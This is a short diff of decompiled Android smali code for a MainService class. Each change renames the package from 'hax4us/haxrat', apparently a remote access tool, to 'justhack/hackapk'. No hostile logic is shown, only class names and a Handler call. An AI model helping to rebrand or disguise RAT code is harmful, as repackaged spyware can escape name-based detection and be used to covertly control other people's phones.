@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/MainService;
+.class public Lcom/justhack/hackapk/MainService;
 .super Landroid/app/Service;
 .source "MainService.java"
 
@@ -6,8 +6,8 @@
 # annotations
 .annotation system Ldalvik/annotation/MemberClasses;
     value = {
-        Lcom/hax4us/haxrat/MainService$100000000;,
-        Lcom/hax4us/haxrat/MainService$100000001;
+        Lcom/justhack/hackapk/MainService$100000000;,
+        Lcom/justhack/hackapk/MainService$100000001;
     }
 .end annotation
 
@@ -122,7 +122,7 @@
     .line 97
     move-object v6, v4
 
-    new-instance v7, Lcom/hax4us/haxrat/MainService$100000001;
+    new-instance v7, Lcom/justhack/hackapk/MainService$100000001;
 
     move-object v10, v7
 
@@ -132,7 +132,7 @@
 
     move-object v9, v2
 
-    invoke-direct {v8, v9}, Lcom/hax4us/haxrat/MainService$100000001;-><init>(Ljava/lang/reflect/Method;)V
+    invoke-direct {v8, v9}, Lcom/justhack/hackapk/MainService$100000001;-><init>(Ljava/lang/reflect/Method;)V
 
     invoke-virtual {v6, v7}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
 
